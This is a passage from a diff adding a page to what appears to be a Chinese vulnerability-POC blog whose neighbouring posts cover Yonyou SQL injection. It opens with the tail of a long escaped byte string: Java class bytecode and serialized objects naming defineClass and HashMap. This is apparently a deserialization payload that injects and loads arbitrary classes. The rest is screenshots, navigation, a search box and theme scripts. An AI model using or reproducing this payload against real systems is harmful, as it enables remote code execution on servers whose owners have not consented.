bd\x00\x1c\xb6\x00\x1d\x19\x0d\x03\xbd\x00\x1e\xb6\x00\x1f:\x0e\x19\x0d\xb6\x00\x04\x12 \x04\xbd\x00\x1cY\x03\x12!S\xb6\x00\x1d\x19\x0d\x04\xbd\x00\x1eY\x03\x12\&quot;S\xb6\x00\x1f\xc0\x00!:\x0f\x19\x0f\xc7\x00\x06\xa7\xff\x91*\x19\x0f\xb6\x00#\xb6\x00$:\x10\x19\x0e\xb6\x00\x04\x12%\x04\xbd\x00\x1cY\x03\xb2\x00&amp;S\xb6\x00\x1d\x19\x0e\x04\xbd\x00\x1eY\x03\x11\x00\xc8\xb8\x00&#x27;S\xb6\x00\x1fW*\x12\x28\xb6\x00\x29:\x11\x19\x11\xb6\x00*:\x09\x19\x11\x12+\x06\xbd\x00\x1cY\x03\x12,SY\x04\xb2\x00&amp;SY\x05\xb2\x00&amp;S\xb6\x00-\x19\x09\x06\xbd\x00\x1eY\x03\x19\x10SY\x04\x03\xb8\x00&#x27;SY\x05\x19\x10\xbe\xb8\x00&#x27;S\xb6\x00\x1fW\x19\x0e\xb6\x00\x04\x12.\x04\xbd\x00\x1cY\x03\x19\x11S\xb6\x00\x1d\x19\x0e\x04\xbd\x00\x1eY\x03\x19\x09S\xb6\x00\x1fW\xa7\x00O:\x11*\x120\xb6\x00\x29:\x12\x19\x12\x121\x04\xbd\x00\x1cY\x03\x12,S\xb6\x00-\x19\x12\x04\xbd\x00\x1eY\x03\x19\x10S\xb6\x00\x1f:\x09\x19\x0e\xb6\x00\x04\x12.\x04\xbd\x00\x1cY\x03\x19\x12S\xb6\x00\x1d\x19\x0e\x04\xbd\x00\x1eY\x03\x19\x09S\xb6\x00\x1fW\xa7\x00\x0e\xa7\x00\x05:\x08\x84\x06\x01\xa7\xfd\xa7\xb1\x00\x07\x00\xa0\x00\xab\x00\xae\x00\x12\x00\xce\x00\xdc\x00\xdf\x00\x12\x01\xc4\x020\x023\x00/\x00?\x00D\x02\x85\x00/\x00G\x00b\x02\x85\x00/\x00e\x00\x85\x02\x85\x00/\x00\x88\x02\x7f\x02\x85\x00/\x00\x01\x00\x9a\x00\x00\x00\xde\x007\x00\x00\x00\x17\x00\x04\x00\x18\x00\x0b\x00\x19\x00\x15\x00\x1a\x00\x1a\x00\x1b\x00&amp;\x00\x1d\x00?\x00\x1f\x00G\x00 \x00N\x00!\x00e\x00\&quot;\x00p\x00#\x00u\x00$\x00\x7d\x00%\x00\x88\x00&amp;\x00\x93\x00&#x27;\x00\x98\x00\x28\x00\xa0\x00*\x00\xab\x00-\x00\xae\x00+\x00\xb0\x00,\x00\xc1\x00.\x00\xc6\x00/\x00\xce\x001\x00\xdc\x004\x00\xdf\x002\x00\xe1\x003\x00\xec\x005\x00\xf1\x006\x00\xf9\x007\x01\x04\x008\x01\x09\x009\x01\x17\x00:\x013\x00;\x01&gt;\x00&lt;\x01C\x00=\x01K\x00&gt;\x01d\x00?\x01\x8a\x00@\x01\x8f\x00A\x01\x92\x00C\x01\x9d\x00D\x01\xc4\x00F\x01\xcc\x00G\x01\xd3\x00H\x02\x0e\x00I\x020\x00N\x023\x00J\x025\x00K\x02=\x00L\x02]\x00M\x02\x7f\x00O\x02\x82\x00S\x02\x85\x00Q\x02\x87\x00\x1d\x02\x8d\x00U\x00\x9b\x00\x00\x00\x04\x00\x01\x00/\x00\x01\x00\x9c\x00\x9d\x00\x03\x00\x99\x00\x00\x009\x00\x02\x00\x03\x00\x00\x00\x11+\xb8\x002\xb0M\xb8\x00\x02\xb6\x004+\xb6\x005\xb0\x00\x01\x00\x00\x00\x04\x00\x05\x003\x00\x01\x00\x9a\x00\x00\x00\x0e\x00\x03\x00\x00\x00_\x00\x05\x00`\x00\x06\x00a\x00\x9b\x00\x00\x00\x04\x00\x01\x003\x00\x9e\x00\x00\x00\x02\x00\x9f\x00\x01\x00\xa0\x00\xa1\x00\x01\x00\x99\x00\x00\x00\xff\x00\x04\x00\x04\x00\x00\x00\x9b+\xc6\x00\x0c\x126+\xb6\x007\x99\x00\x06\x128\xb0+\xb6\x009L+\x12:\xb6\x00;\x99\x00;*+\xb7\x00&lt;\x12=\xb6\x00&gt;M,\xbe\x05\x9f\x00\x06\x12?\xb0*,\x032\xb5\x00@*,\x042\xb8\x00A\xb8\x00&#x27;\xb5\x00B\xbb\x00CY*\xb7\x00DN-\xb6\x00E\x12F\xb0+\x12G\xb6\x00;\x99\x00\&quot;*+\xb7\x00&lt;\x12=\xb6\x00&gt;M,\xbe\x05\x9f\x00\x06\x12H\xb0*,\x032,\x042\xb6\x00I\xb0+\x12J\xb6\x00;\x99\x00\x0d**+\xb7\x00&lt;\xb6\x00K\xb0**+\xb7\x00&lt;\xb6\x00K\xb0\x00\x00\x00\x01\x00\x9a\x00\x00\x00R\x00\x14\x00\x00\x00k\x00\x0d\x00l\x00\x10\x00n\x00\x15\x00o\x00\x1e\x00q\x00\x29\x00r\x00/\x00s\x002\x00u\x009\x00v\x00F\x00w\x00O\x00x\x00S\x00y\x00V\x00z\x00_\x00\x7b\x00j\x00|\x00p\x00\x7d\x00s\x00\x7f\x00~\x00\x80\x00\x87\x00\x81\x00\x91\x00\x83\x00\x01\x00\xa2\x00\xa3\x00\x01\x00\x99\x00\x00\x00v\x00\x03\x00\x05\x00\x00\x006\xbb\x00LY+\xb7\x00MN\xbb\x00NY-\xb7\x00O:\x04\x19\x04,\xb8\x00P\xb6\x00Q\x19\x04\xb6\x00R\x19\x04\xb6\x00S\xa7\x00\x0b:\x04\x19\x04\xb6\x00T\xb0-\xb6\x00U\xb0\x00\x01\x00\x09\x00&amp;\x00\x29\x00/\x00\x01\x00\x9a\x00\x00\x00&amp;\x00\x09\x00\x00\x00\x8e\x00\x09\x00\x90\x00\x13\x00\x91\x00\x1c\x00\x92\x00!\x00\x93\x00&amp;\x00\x96\x00\x29\x00\x94\x00+\x00\x95\x001\x00\x97\x00\x02\x00\xa4\x00\xa1\x00\x01\x00\x99\x00\x00\x00/\x00\x03\x00\x02\x00\x00\x00\x17+\x12:\x126\xb6\x00V\x12J\x126\xb6\x00V\x12G\x126\xb6\x00V\xb0\x00\x00\x00\x01\x00\x9a\x00\x00\x00\x06\x00\x01\x00\x00\x00\xa0\x00\x01\x00\xa5\x00\xa1\x00\x01\x00\x99\x00\x00\x01\xc3\x00\x04\x00\x09\x00\x00\x01&#x27;\x12W\xb8\x00X\xb6\x00YM+\xb6\x009L\x01N,\x12Z\xb6\x00\x0c\x99\x00@+\x12[\xb6\x00\x0c\x99\x00 +\x12\\\xb6\x00\x0c\x9a\x00\x17\xbb\x00]Y\xb7\x00^+\xb6\x00_\x12`\xb6\x00_\xb6\x00aL\x06\xbd\x00!Y\x03\x12\&quot;SY\x04\x12bSY\x05+S:\x04\xa7\x00=+\x12[\xb6\x00\x0c\x99\x00 +\x12\\\xb6\x00\x0c\x9a\x00\x17\xbb\x00]Y\xb7\x00^+\xb6\x00_\x12c\xb6\x00_\xb6\x00aL\x06\xbd\x00!Y\x03\x12dSY\x04\x12eSY\x05+S:\x04\xb8\x00f\x19\x04\xb6\x00gN\xbb\x00hY-\xb6\x00i\xb7\x00j\x12k\xb6\x00l:\x05\x19\x05\xb6\x00m\x99\x00\x0b\x19\x05\xb6\x00n\xa7\x00\x05\x126:\x06\xbb\x00hY-\xb6\x00o\xb7\x00j\x12k\xb6\x00l:\x05\xbb\x00]Y\xb7\x00^\x19\x06\xb6\x00_\x19\x05\xb6\x00m\x99\x00\x0b\x19\x05\xb6\x00n\xa7\x00\x05\x126\xb6\x00_\xb6\x00a:\x06\x19\x06:\x07-\xc6\x00\x07-\xb6\x00p\x19\x07\xb0:\x05\x19\x05\xb6\x00T:\x06-\xc6\x00\x07-\xb6\x00p\x19\x06\xb0:\x08-\xc6\x00\x07-\xb6\x00p\x19\x08\xbf\x00\x04\x00\x90\x00\xfb\x01\x06\x00/\x00\x90\x00\xfb\x01\x1a\x00\x00\x01\x06\x01\x0f\x01\x1a\x00\x00\x01\x1a\x01\x1c\x01\x1a\x00\x00\x00\x01\x00\x9a\x00\x00\x00j\x00\x1a\x00\x00\x00\xa9\x00\x09\x00\xaa\x00\x0e\x00\xab\x00\x10\x00\xad\x00\x19\x00\xae\x00+\x00\xaf\x00?\x00\xb1\x00V\x00\xb3\x00h\x00\xb4\x00|\x00\xb6\x00\x90\x00\xb9\x00\x99\x00\xba\x00\xab\x00\xbb\x00\xbf\x00\xbc\x00\xd1\x00\xbd\x00\xf7\x00\xbe\x00\xfb\x00\xc2\x00\xff\x00\xc3\x01\x03\x00\xbe\x01\x06\x00\xbf\x01\x08\x00\xc0\x01\x0f\x00\xc2\x01\x13\x00\xc3\x01\x17\x00\xc0\x01\x1a\x00\xc2\x01 \x00\xc3\x00\x01\x00\xa6\x00\xa7\x00\x01\x00\x99\x00\x00\x01r\x00\x04\x00\x0c\x00\x00\x00\xe2\x12W\xb8\x00X\xb6\x00Y\x12Z\xb6\x00\x0c\x9a\x00\x09\x12qN\xa7\x00\x06\x12rN\xb8\x00f-\xb6\x00s:\x04\xbb\x00tY+\x1c\xb7\x00u:\x05\x19\x04\xb6\x00i:\x06\x19\x04\xb6\x00o:\x07\x19\x05\xb6\x00v:\x08\x19\x04\xb6\x00w:\x09\x19\x05\xb6\x00x:\x0a\x19\x05\xb6\x00y\x9a\x00`\x19\x06\xb6\x00z\x9e\x00\x10\x19\x0a\x19\x06\xb6\x00\x7b\xb6\x00|\xa7\xff\xee\x19\x07\xb6\x00z\x9e\x00\x10\x19\x0a\x19\x07\xb6\x00\x7b\xb6\x00|\xa7\xff\xee\x19\x08\xb6\x00z\x9e\x00\x10\x19\x09\x19\x08\xb6\x00\x7b\xb6\x00|\xa7\xff\xee\x19\x0a\xb6\x00\x7d\x19\x09\xb6\x00\x7d\x14\x00~\xb8\x00\x80\x19\x04\xb6\x00\x81W\xa7\x00\x08:\x0b\xa7\xff\x9e\x19\x04\xb6\x00p\x19\x05\xb6\x00\x82\xa7\x00 N\xbb\x00]Y\xb7\x00^\x12\x83\xb6\x00_-\xb6\x00\x84\xb6\x00_\x12\x85\xb6\x00_\xb6\x00a\xb0\x12\x86\xb0\x00\x02\x00\xa7\x00\xad\x00\xb0\x00/\x00\x00\x00\xbf\x00\xc2\x00/\x00\x01\x00\x9a\x00\x00\x00n\x00\x1b\x00\x00\x00\xd1\x00\x10\x00\xd2\x00\x16\x00\xd4\x00\x19\x00\xd6\x00\&quot;\x00\xd7\x00-\x00\xd8\x00B\x00\xd9\x00P\x00\xda\x00X\x00\xdb\x00`\x00\xdc\x00m\x00\xde\x00u\x00\xdf\x00\x82\x00\xe1\x00\x8a\x00\xe2\x00\x97\x00\xe4\x00\x9c\x00\xe5\x00\xa1\x00\xe6\x00\xa7\x00\xe8\x00\xad\x00\xe9\x00\xb0\x00\xea\x00\xb2\x00\xeb\x00\xb5\x00\xed\x00\xba\x00\xee\x00\xbf\x00\xf1\x00\xc2\x00\xef\x00\xc3\x00\xf0\x00\xdf\x00\xf2\x00\x01\x00\xa8\x00\x98\x00\x01\x00\x99\x00\x00\x00-\x00\x03\x00\x01\x00\x00\x00\x11**\xb4\x00@*\xb4\x00B\xb6\x00\x87\xb6\x00\x88W\xb1\x00\x00\x00\x01\x00\x9a\x00\x00\x00\x0a\x00\x02\x00\x00\x00\xf7\x00\x10\x00\xf8\x00\x09\x00\xa9\x00\xaa\x00\x01\x00\x99\x00\x00\x01\x1c\x00\x06\x00\x04\x00\x00\x00\xac\x01L\x12\x89\xb8\x002M,\x12\x8a\x04\xbd\x00\x1cY\x03\x12!S\xb6\x00\x1d,\xb6\x00*\x04\xbd\x00\x1eY\x03*S\xb6\x00\x1f\xc0\x00,\xc0\x00,L\xa7\x00\x04M+\xc7\x00C\x12\x8b\xb8\x002\x12\x8c\x03\xbd\x00\x1c\xb6\x00\x1d\x01\x03\xbd\x00\x1e\xb6\x00\x1fM,\xb6\x00\x04\x12\x8d\x04\xbd\x00\x1cY\x03\x12!S\xb6\x00\x1d,\x04\xbd\x00\x1eY\x03*S\xb6\x00\x1f\xc0\x00,\xc0\x00,L\xa7\x00\x04M+\xc7\x004\x12\x8e\xb8\x002M,\x12\x8d\x04\xbd\x00\x1cY\x03\x12!S\xb6\x00\x1dN-,\xb6\x00*\x04\xbd\x00\x1eY\x03*S\xb6\x00\x1f\xc0\x00,\xc0\x00,L\xa7\x00\x04M+\xb0\x00\x03\x00\x02\x00-\x000\x00/\x005\x00q\x00t\x00/\x00y\x00\xa6\x00\xa9\x00/\x00\x01\x00\x9a\x00\x00\x00F\x00\x11\x00\x00\x01\x00\x00\x02\x01\x02\x00\x08\x01\x03\x00-\x01\x06\x000\x01\x04\x001\x01\x07\x005\x01\x09\x00L\x01\x0a\x00q\x01\x0d\x00t\x01\x0b\x00u\x01\x0f\x00y\x01\x11\x00\x7f\x01\x12\x00\x8f\x01\x13\x00\xa6\x01\x16\x00\xa9\x01\x14\x00\xaa\x01\x18\x00\x01\x00\xab\x00\x00\x00\x02\x00\xact\x00\x0bdefineClassuq\x00~\x00\x1a\x00\x00\x00\x02vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpvq\x00~\x00\x28sq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01uq\x00~\x00\x1a\x00\x00\x00\x00q\x00~\x00\x1cuq\x00~\x00\x1a\x00\x00\x00\x01q\x00~\x00\x1esq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01uq\x00~\x00\x18\x00\x00\x00\x00q\x00~\x00\&quot;uq\x00~\x00\x1a\x00\x00\x00\x01q\x00~\x00$sq\x00~\x00\x0fsq\x00~\x00\x00w\x0c\x00\x00\x00\x10?@\x00\x00\x00\x00\x00\x00xsr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262116319.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262115766.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" class="category-chain-item">漏洞知识库</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E7%94%A8%E5%8F%8BU8%20Cloud-ArchiveVerify%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="用友U8 Cloud-ArchiveVerify存在SQL注入漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">用友U8 Cloud-ArchiveVerify存在SQL注入漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3link%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="用友NC系统接口link存在SQL注入漏洞">
+                        <span class="hidden-mobile">用友NC系统接口link存在SQL注入漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
